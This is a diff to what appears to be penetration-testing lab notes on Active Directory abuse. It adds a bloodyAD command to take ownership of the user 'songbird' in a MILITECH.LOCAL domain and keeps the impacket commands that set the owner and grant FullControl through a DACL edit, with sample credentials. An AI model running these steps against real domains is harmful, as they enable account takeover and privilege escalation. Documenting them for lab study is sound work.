@@ -8,9 +8,13 @@
 impacket-owneredit -action 'write' -new-owner 's.reed' -target 'songbird' 'MILITECH.LOCAL'/'S.REED':'P@ssword123'
 ```
 
+```bash
+bloodyAD --host "13.13.13.13" -d "MILITECH.LOCAL" -u "s.reed" -p "Password123" set owner management songbird
+```
+
 ## <mark style="color:yellow;">Adding a FullAccess DACL</mark>
 
-> Since we are the owner, we can write to ourselves full access to user songbird
+> Since we are the owner, we can write to ourselves full access to user songbird. Groups also count, just change target to songbird to group name.
 
 ```powershell
 impacket-dacledit -action 'write' -rights 'FullControl' -principal 's.reed' -target 'songbird' 'MILITECH.LOCAL'/'S.REED':'P@ssword123'
